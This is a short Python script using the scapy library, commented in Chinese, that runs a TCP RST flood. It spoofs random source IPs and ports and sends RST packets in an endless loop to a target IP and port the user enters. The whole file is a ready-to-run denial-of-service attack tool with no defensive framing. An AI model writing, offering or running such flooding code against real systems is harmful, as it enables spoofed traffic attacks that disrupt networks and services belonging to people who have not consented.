# 导入scapy库
from scapy.all import *
from scapy.layers.inet import TCP, IP


# 定义一个函数，用于发送TCP RST包
def send_tcp_rst(ip, port):
    # 生成一个随机的源IP和源端口
    src_ip = RandIP()
    src_port = RandShort()
    # 创建一个TCP包，设置标志位为RST，序列号为0
    tcp = TCP(sport=src_port, dport=port, flags="R", seq=0)
    # 创建一个IP包，设置目标IP和源IP
    ip = IP(dst=ip, src=src_ip)
    # 组合IP包和TCP包
    pkt = ip / tcp
    # 发送数据包，并忽略返回值
    send(pkt, verbose=False)

# 定义一个函数，用于进行TCP RST洪水攻击
def tcp_rst_flood(ip, port):
    # 无限循环
    while True:
        # 调用发送TCP RST包的函数
        send_tcp_rst(ip, port)

# 输入目标IP和端口
target_ip = input("请输入目标IP: ")
target_port = int(input("请输入目标端口: "))

# 调用进行TCP RST洪水攻击的函数
tcp_rst_flood(target_ip, target_port)
